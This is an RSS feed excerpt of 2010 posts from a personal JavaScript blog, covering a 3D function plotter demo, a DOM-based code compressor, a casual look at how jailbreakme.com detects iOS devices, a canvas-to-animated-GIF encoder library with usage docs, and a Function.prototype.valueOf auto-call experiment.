      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/1k%20JS%203d%20Function%20Plotter/Screenshot-JS1k-1k-demo-submission-62-Chromium-1.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/1k%20JS%203d%20Function%20Plotter/Screenshot-JS1k-1k-demo-submission-62-Chromium-1.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot-JS1k, 1k demo submission [62] - Chromium-1&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Interestingly, it does seem that a lot of the&lt;a href=&quot;http://js1k.com/demos&quot;&gt; demos for the js1k&lt;/a&gt; competition are a whole lot more impressive than the &lt;a href=&quot;http://10k.aneventapart.com/&quot;&gt;10k competition&lt;/a&gt;. Despite that js1k started with no prizes and 10k has a collective $10,000 worth of prizes. &lt;a href=&quot;http://js1k.com/demo/4&quot;&gt;Though&lt;/a&gt; &lt;a href=&quot;http://js1k.com/demo/19&quot;&gt;I&lt;/a&gt; &lt;a href=&quot;http://js1k.com/demo/47&quot;&gt;do&lt;/a&gt; &lt;a href=&quot;http://js1k.com/demo/62&quot;&gt;have&lt;/a&gt; &lt;a href=&quot;http://js1k.com/demo/62&quot;&gt;several&lt;/a&gt; &lt;a href=&quot;http://10k.aneventapart.com/Entry/46&quot;&gt;entries&lt;/a&gt; on &lt;a href=&quot;http://10k.aneventapart.com/Entry/18&quot;&gt;both&lt;/a&gt;. Anyway, this is the continuation of &lt;a href=&quot;http://antimatter15.com/2010/08/1k-js-3d-function-plotter/2010/05/simple-javascript-3d-function-plotter/&quot;&gt;my old 3d function&lt;/a&gt; plotter, but that one doesn’t work anymore because i’m evil and hotlinked the  github repo and three.js updated in an api-breaking way.&lt;/p&gt;
&lt;p&gt;Anyway, after you vote up &lt;a href=&quot;http://10k.aneventapart.com/Entry/46&quot;&gt;http://10k.aneventapart.com/Entry/46&lt;/a&gt; and &lt;a href=&quot;http://10k.aneventapart.com/Entry/18&quot;&gt;http://10k.aneventapart.com/Entry/18&lt;/a&gt; you should totally try out my 3d function plotter at &lt;a href=&quot;http://js1k.com/demo/62&quot;&gt;http://js1k.com/demo/62&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>DOM Indexer JS Compression</title>
      <link>http://antimatter15.com/2010/08/dom-indexer-js-compression/</link>
      <pubDate>Thu, 05  Aug 2010 07:20:40 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/08/dom-indexer-js-compression/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/DOM%20Indexer%20JS%20Compression/Screenshot.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/DOM%20Indexer%20JS%20Compression/Screenshot.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;There’s lots of compression systems for JS out there. There’s the really smart JS rewriter magical rhino-based ones like Closure and YUI. There’s the string-based ones, packer base62, huffman, and lz77. But of the latter category, they all rely on a sort of dictionary coder, where the dictionary (or huffman tree) needs to be sent alongside the compressed content.&lt;/p&gt;
&lt;p&gt;Unlike strings of bits, javascript code often refers to methods on the document object model. If we were to crawl the DOM, we could get a list of DOM properties and use that as the shared dictionary which doesn’t need to be changed, sent or stored. Ever.&lt;/p&gt;
&lt;p&gt;Example:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='ruby'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-prompt&quot;&gt;document.getElementById —&amp;gt;&lt;/span&gt; &lt;span class=&quot;hljs-variable&quot;&gt;$dgEln&lt;/span&gt;

&lt;span class=&quot;hljs-prompt&quot;&gt;document.body.appendChild(s); -&amp;gt;&lt;/span&gt; &lt;span class=&quot;hljs-variable&quot;&gt;$dbaChp&lt;/span&gt;(s);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And as the dictionary never needs to be stored, it’s dynamically computed based on the default browser DOM, there is a constant overhead for the indexer. The dictionary does not change size based on the size of the content.&lt;/p&gt;
&lt;p&gt;The first prototype relied on recursively indexing properties 2-3 levels from window using the ES5 &lt;code&gt;Object.getOwnPropertyNames&lt;/code&gt;.  That feature is only supported on IE9, Chrome 6, probably the latest versions of Safari and Firefox 4. As such, it severely limits the applicability of the algorithm.&lt;/p&gt;
&lt;p&gt;Version two switches it to a simple for..in loop. The problem here is that it’s no loner possible to index certain things. Properties like Math, which are marked DontEnum internally can not be iterated, and thus can not be compressed (Math.cos would have been &lt;code&gt;$Mac8&lt;/code&gt;). However, it probably makes up for this by recursively indexing things substrings of the discovered objects. So document.getElementById would be interpreted as the full &lt;code&gt;document.getElementById&lt;/code&gt; instead of seperately compressing document and &lt;code&gt;getElementById&lt;/code&gt;. It also uses a new hash function which makes the output more readable and the length proportional to the length of the source. length becomes &lt;code&gt;$l6&lt;/code&gt;, and &lt;code&gt;document.body.removeChild&lt;/code&gt; becomes &lt;code&gt;$dbrChp&lt;/code&gt;. However, this also removes the possibility of that nice fallback on things not supported by the browser. (&lt;code&gt;if(document.getElementsByClassName){}else{}&lt;/code&gt; would have been translated as d3k2.s93k and back as &lt;code&gt;document.s93k&lt;/code&gt; on browsers that dont support it and so browser detection gracefully degrades without blah is not defined errors).&lt;/p&gt;
&lt;p&gt;Overall. What is the compression ratio? Not that great. If you do lots and lots of DOM access then you might get a decent ratio, but the code is slow and the ratios are relatively insignificant.&lt;/p&gt;
&lt;p&gt;Minify: &lt;a href=&quot;http://antimatter15.com/misc/js-minify/minify.html&quot;&gt;http://antimatter15.com/misc/js-minify/minify.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Maxify (decoder): &lt;a href=&quot;http://antimatter15.com/misc/js-minify/maxify.html&quot;&gt;http://antimatter15.com/misc/js-minify/maxify.html&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>jailbreakme.com</title>
      <link>http://antimatter15.com/2010/08/jailbreakme-com/</link>
      <pubDate>Sun, 01  Aug 2010 04:27:24 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/08/jailbreakme-com/</guid>
      <author></author>
      <description>&lt;p&gt;I couldn’t resist looking into the source of it. It is obfuscated a bit, but there are some interesting parts. Example: How it detects device models.&lt;/p&gt;
&lt;p&gt;For iPad, well there’s just one iPad so they just search the UA string for iPad and it’s totally iPad1,1. iPhone 4 is detected by the global devicePixelRatio property, because&lt;a href=&quot;http://aralbalkan.com/3331&quot;&gt; the pixel is dying&lt;/a&gt;. Differentiating between iPhone models (not just firmware versions) is pretty awesome. They do a speed test. Specifically, &lt;a href=&quot;http://www2.webkit.org/perf/sunspider-0.9/sunspider.html&quot;&gt;SunSpider&lt;/a&gt;. It’s pretty much the de-facto standard web benchmark nowadays, and it was also started by Apple for the Webkit project.&lt;/p&gt;
&lt;p&gt;Apart from that, the exploit itself is PDF based. Which is interesting as Adobe Reader &lt;a href=&quot;http://www.computerworld.com/s/article/9157438/Rogue_PDFs_account_for_80_of_all_exploits_says_researcher&quot;&gt;accounted for 80% of exploits&lt;/a&gt; in 2009. However, iOS’s implementation is probably totally independent, but it’s neat seeing this happen. The exploit is located at &lt;a href=&quot;http://jailbreakme.com/_/device_model/device_firmware.pdf&quot;&gt;http://jailbreakme.com/_/device_model/device_firmware.pdf&lt;/a&gt;. For example, the iPhone 4’s URL would be &lt;a href=&quot;http://jailbreakme.com/_/iPhone3,1/4.0.pdf&quot;&gt;http://jailbreakme.com/_/iPhone3,1/4.0.pdf&lt;/a&gt;. The resulting file is 12.9KB. I assume it’s some pretty standard attack code because I’m not a hacker and I know absolutely nothing about that.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>JavaScript &lt;canvas&gt; to (Animated) GIF</title>
      <link>http://antimatter15.com/2010/07/javascript-canvas-to-animated-gif/</link>
      <pubDate>Fri, 23 Jul 2010 01:19:54 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/07/javascript-canvas-to-animated-gif/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;This is the GIF which was generated from the canvas.&quot;  src=&quot;/articles/2010/JavaScript%20canvas%20to%20(Animated)%20GIF/converted_animation.gif&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;This is the raw canvas element saved as a non-animated PNG&quot;  src=&quot;/articles/2010/JavaScript%20canvas%20to%20(Animated)%20GIF/raw_canvas.png&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;I’ve &lt;a href=&quot;http://antimatter15.com/2010/07/javascript-canvas-to-animated-gif/2009/08/webworkers-canvas-glif-gifencoder-client-side-animated-gif-generation/&quot;&gt;tried this before&lt;/a&gt; but it didn’t work. &lt;code&gt;&amp;lt;canvas&amp;gt;&lt;/code&gt; can’t do &lt;code&gt;toDataURL(&amp;#39;image/gif&amp;#39;)&lt;/code&gt;, and the primitive GLIF library couldn’t do much so I never had the opportunity to test my gif-merging code that I had. But I’m at it again, this time, porting it from the AS3GIF library, an awesomely comprehensive bitmap to binary gif encoder that even supports LZW compression (and the patent has luckily expired. Yay!). AS3Gif is supposed to “play and encode animated GIFs”, but since web pages can usually natively play GIFs fine, it’s only a port of the GIFEncoder portions of the library. And it works really well. The rest of this post is copied from the&lt;a href=&quot;http://github.com/antimatter15/jsgif&quot;&gt; Github readme&lt;/a&gt;. Interesting how the w2_embed/anonybot embed post was a blog post turned into readme, this is a readme turned into blogpost. I’ll start with a link to the Github repo anyway:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://github.com/antimatter15/jsgif&quot;&gt;http://github.com/antimatter15/jsgif&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;basic-usage&quot;&gt;Basic Usage&lt;/h3&gt;
&lt;p&gt;Since it pretty much &lt;em&gt;is&lt;/em&gt; GIFEncoder, you could consult the &lt;a href=&quot;http://code.google.com/p/as3gif/wiki/How_to_use#The_GIFEncoder&quot;&gt;as3gif how-to page&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;But there are some differences so I’ll cover it here anyway.!&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2010/JavaScript%20canvas%20to%20(Animated)%20GIF/clock.gif&quot;&gt;This is the GIF which was generated from the canvas.&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;You first need to include the JS files. It’s probably best if you include it in this order, but it shouldnt’ matter too much.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='handlebars'&gt;&lt;/span&gt;&lt;span class=&quot;xml&quot;&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;LZWEncoder.js&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;NeuQuant.js&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt; 
&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;GIFEncoder.js&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you want to render the gif through an inline &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tag or try to save to disk or send to server or anything that requires conversion into a non-binary string form, you should probably include &lt;code&gt;b64.js&lt;/code&gt; too.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='handlebars'&gt;&lt;/span&gt;&lt;span class=&quot;xml&quot;&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;b64.js&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Simple enough right? Now to convert stuff to GIF, you need to have a working or at least some imageData-esque array.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='handlebars'&gt;&lt;/span&gt;&lt;span class=&quot;xml&quot;&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;canvas&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;bitmap&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;canvas&lt;/span&gt;&amp;gt;&lt;/span&gt; 
&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt; 
  &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; canvas = &lt;span class=&quot;hljs-built_in&quot;&gt;document&lt;/span&gt;.getElementById(&lt;span class=&quot;hljs-string&quot;&gt;'bitmap'&lt;/span&gt;); 
  &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; context = canvas.getContext(&lt;span class=&quot;hljs-string&quot;&gt;'2d'&lt;/span&gt;); 
  context.fillStyle = &lt;span class=&quot;hljs-string&quot;&gt;'rgb(255,255,255)'&lt;/span&gt;; 
  context.fillRect(&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;,canvas.width, canvas.height); &lt;span class=&quot;hljs-comment&quot;&gt;//GIF can't do transparent so do white &lt;/span&gt;
  context.fillStyle = &lt;span class=&quot;hljs-string&quot;&gt;&quot;rgb(200,0,0)&quot;&lt;/span&gt;; 
  context.fillRect (&lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;75&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;50&lt;/span&gt;); &lt;span class=&quot;hljs-comment&quot;&gt;//draw a little red box&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now we need to init the GIFEncoder.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='coffeescript'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-reserved&quot;&gt;var&lt;/span&gt; encoder = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; GIFEncoder();
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;em&gt;If&lt;/em&gt; you are making an animated gif, you need to add the following&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='vhdl'&gt;&lt;/span&gt;encoder.setRepeat(&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;); //&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt; -&amp;gt; &lt;span class=&quot;hljs-keyword&quot;&gt;loop&lt;/span&gt; forever //&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;+ -&amp;gt; &lt;span class=&quot;hljs-keyword&quot;&gt;loop&lt;/span&gt; n times &lt;span class=&quot;hljs-keyword&quot;&gt;then&lt;/span&gt; stop 
encoder.setDelay(&lt;span class=&quot;hljs-number&quot;&gt;500&lt;/span&gt;); //go &lt;span class=&quot;hljs-keyword&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;next&lt;/span&gt; frame every n milliseconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, you need to tell the magical thing that you’re gonna start inserting frames (even if it’s only one).&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='dos'&gt;&lt;/span&gt;encoder.&lt;span class=&quot;hljs-built_in&quot;&gt;start&lt;/span&gt;();
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And for the part that took the longest to port: adding a real frame.
    encoder.addFrame(context);&lt;/p&gt;
&lt;p&gt;In the GIFEncoder version, it accepts a Bitmap. Well, that doesn’t exist in Javascript (natively, anyway) so instead, I use what I feel is a decent analogue: the canvas context. However, if you’re in a situation where you don’t have a real &lt;code&gt;&amp;lt;canvas&amp;gt;&lt;/code&gt; element. That’s &lt;em&gt;okay&lt;/em&gt;. You can set the second parameter to true and pass a imageData.data-esque array as your first argument. So in other words, you can do &lt;code&gt;encoder.addFrame(fake_imageData, true)&lt;/code&gt;as an alternative. However, you &lt;em&gt;must&lt;/em&gt; do an &lt;code&gt;encoder.setSize(width, height);&lt;/code&gt; before you do any of the addFrames if you pass a imageData.data-like array. If you pass a canvas context, then that’s all okay, because it will automagically do a setSize with the canvas width/height stuff.&lt;/p&gt;
&lt;p&gt;Now the last part is to finalize the animation and get it for display.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='coffeescript'&gt;&lt;/span&gt;encoder.finish(); 
&lt;span class=&quot;hljs-reserved&quot;&gt;var&lt;/span&gt; binary_gif = encoder.stream().getData() &lt;span class=&quot;hljs-regexp&quot;&gt;//&lt;/span&gt;notice &lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;is&lt;/span&gt; different from the as3gif package! 
&lt;span class=&quot;hljs-reserved&quot;&gt;var&lt;/span&gt; data_url = &lt;span class=&quot;hljs-string&quot;&gt;'data:image/gif;base64,'&lt;/span&gt;+encode64(binary_gif); 
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;docs&quot;&gt;Docs&lt;/h3&gt;
&lt;p&gt;Each of the files exposes a single global (see, at least it’s considerate!). But since there’s three files, that means that there’s three globals. But two of them are more of supporting libraries that I don’t totally understand or care about enough to document. So I’m just gonna document GIFEncoder.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;new GIFEncoder()&lt;/code&gt; This is super parent function. You really don’t need the &lt;code&gt;new&lt;/code&gt; keyword because It’s not really even using any special inheritance pattern. It’s a closure that does some &lt;code&gt;var blah = exports.blah = function blah(){&lt;/code&gt; for no good reason. Anyway, it returns an object with a bunch of methods that the section will be devoted to documenting. Note that I’ve never tested more than half of these, so good luck.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Boolean start()&lt;/code&gt; This writes the GIF Header and returns &lt;code&gt;false&lt;/code&gt; if it fails.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Boolean addFrame(CanvasRenderingContext2D context)&lt;/code&gt; This is the magical magic behind everything. This adds a frame.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Boolean addFrame(CanvasPixelArray image, true)&lt;/code&gt; This is the magical magic behind everything. This adds a frame. This time you need
you pass &lt;code&gt;true&lt;/code&gt; as the second argument and then magic strikes and it loads your canvas pixel array (which can be a real array, I dont care and I think the program has learned from my constant apathy to also not care). But note that if you do, you must first manually call
&lt;code&gt;setSize&lt;/code&gt; which is happily defined just below this one.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;void setSize(width, height)&lt;/code&gt; Sets the canvas size. It’s supposed to be private, but I’m exposing it anyway. Gets called automagically as the size of the first frame if you don’t do that crappy hacky imageData.data hack.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;void setDelay(int milliseconds)&lt;/code&gt; the number of milliseconds to wait on each frame&lt;/p&gt;
&lt;p&gt;&lt;code&gt;void setDispose(int code)&lt;/code&gt; Sets the GIF frame disposal code for the last added frame and any subsequent frames. Default is 0 if no transparent color has been set, otherwise 2. I have no clue what this means so I just copypasted
it from the actionscript docs.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;void setFrameRate(Number fps)&lt;/code&gt; Sets frame rate in frames per second. Equivalent to &lt;code&gt;setDelay(1000/fps)&lt;/code&gt;. I think that’s stupid.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;void setQuality(int quality)&lt;/code&gt; Sets quality of color quantization (conversion of images to the maximum 256 colors allowed by the GIF specification). Lower values (minimum = 1) produce better colors, but slow processing significantly. 10 is the default, and produces good color mapping at reasonable speeds. Values greater than 20 do not yield significant improvements in speed. BLAH BLAH BLAH. Whatever&lt;/p&gt;
&lt;p&gt;&lt;code&gt;void setRepeat(int iter)&lt;/code&gt; Sets the number of times the set of GIF frames should be played. Default is 1; 0 means play indefinitely. Must be invoked before the first image is added.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;void setTransparent(Number color)&lt;/code&gt; Sets the transparent color for the last added frame and any subsequent frames. Since all colors are subject to modification in the quantization process, the color in the final palette for each frame closest to the given color becomes the transparent color for that frame. May be set to null to indicate no transparent color.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ByteArray finish()&lt;/code&gt; Adds final trailer to the GIF stream, if you don’t call the finish method the GIF stream will not be valid.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;String stream()&lt;/code&gt; Yay the only function that returns a non void/boolean. It’s the magical stream function which should have been a getter which JS does support but I didnt’ feel like making it a getter because getters are so weird and inconsistent. Like sure there’s the nice pretty &lt;code&gt;get&lt;/code&gt; thing but I think IE9/8 doesn’t implement it because it’s non standard or something and replaced it with a hideously ugly blah blah. So Anyway, it’s a function. It returns a byteArray with three writeByte functions that you wouldn’t care about and a &lt;code&gt;getData()&lt;/code&gt; function which returns a binary string with the GIF. There’s also a &lt;code&gt;.bin&lt;/code&gt; attribute which contains an array with the binary stuff that I don’t care about.&lt;/p&gt;
&lt;h3 id=&quot;webworkers&quot;&gt;WebWorkers&lt;/h3&gt;
&lt;p&gt;The process isn’t really the fastest thing ever, so you should use WebWorkers for piecing together animations more than a few frames long. You can find the rest of the WebWorkers section on the actual readme, because the rest is just a huge block of code with comments.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://github.com/antimatter15/jsgif&quot;&gt;http://github.com/antimatter15/jsgif&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Experiment Ruby-style function auto-calling in Javascript</title>
      <link>http://antimatter15.com/2010/07/experiment-ruby-style-function-auto-calling-in-javascript/</link>
      <pubDate>Wed, 21 Jul 2010 21:21:26 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/07/experiment-ruby-style-function-auto-calling-in-javascript/</guid>
      <author></author>
      <description>&lt;p&gt;I have no clue what it’s called when ruby automatically runs a function.
After not totally understanding &lt;a href=&quot;http://github.com/tobeytailor/def.js&quot;&gt;def.js&lt;/a&gt; and looking at this &lt;a href=&quot;http://github.com/jashkenas/coffee-script/issues/514&quot;&gt;coffee-script issu&lt;/a&gt;e from the &lt;a href=&quot;http://githubissues.heroku.com/#jashkenas/coffee-script/514&quot;&gt;cappuccino github issues browser&lt;/a&gt;. I had a horrible idea.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='javascript'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;Function&lt;/span&gt;.prototype.valueOf = &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;()}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;What does it do?&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='cs'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-function&quot;&gt;function &lt;span class=&quot;hljs-title&quot;&gt;getValue&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;{
    &lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;42&lt;/span&gt;
}
&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(getValue == &lt;span class=&quot;hljs-number&quot;&gt;42&lt;/span&gt;){
    alert(&lt;span class=&quot;hljs-string&quot;&gt;'fortytwo'&lt;/span&gt;)
}&lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;{
    alert(&lt;span class=&quot;hljs-string&quot;&gt;'not fortytwo'&lt;/span&gt;)
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Notice notably absent in the if statement are the expected parentheses ‘()’ needed to call them. It gets stranger still.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='cs'&gt;&lt;/span&gt;alert(getValue == &lt;span class=&quot;hljs-number&quot;&gt;42&lt;/span&gt;); &lt;span class=&quot;hljs-comment&quot;&gt;//true&lt;/span&gt;
alert(getValue() == &lt;span class=&quot;hljs-number&quot;&gt;42&lt;/span&gt;); &lt;span class=&quot;hljs-comment&quot;&gt;//true&lt;/span&gt;
alert(getValue() === &lt;span class=&quot;hljs-number&quot;&gt;42&lt;/span&gt;); &lt;span class=&quot;hljs-comment&quot;&gt;//true&lt;/span&gt;
alert(getValue === &lt;span class=&quot;hljs-number&quot;&gt;42&lt;/span&gt;); &lt;span class=&quot;hljs-comment&quot;&gt;//false&lt;/span&gt;
&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;typeof&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;getValue&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;hljs-comment&quot;&gt;//number&lt;/span&gt;
&lt;span class=&quot;hljs-keyword&quot;&gt;typeof&lt;/span&gt; getValue &lt;span class=&quot;hljs-comment&quot;&gt;//function&lt;/span&gt;

&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; sample1 &lt;/span&gt;= getValue;
&lt;span class=&quot;hljs-keyword&quot;&gt;typeof&lt;/span&gt;(sample1) &lt;span class=&quot;hljs-comment&quot;&gt;//function&lt;/span&gt;

&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; sample2 = getValue();
&lt;span class=&quot;hljs-keyword&quot;&gt;typeof&lt;/span&gt;(sample2) &lt;span class=&quot;hljs-comment&quot;&gt;//number&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;One advantage is that it makes a super hacky/semi-working implementation of getters that &lt;em&gt;should&lt;/em&gt; work universally (maybe). Except that it doesn’t. It’s practically useless.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>ShinyTouch/OpenCV</title>
      <link>http://antimatter15.com/2010/07/shinytouch-opencv/</link>
      <pubDate>Thu, 15 Jul 2010 06:01:26 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/07/shinytouch-opencv/</guid>
      <author></author>
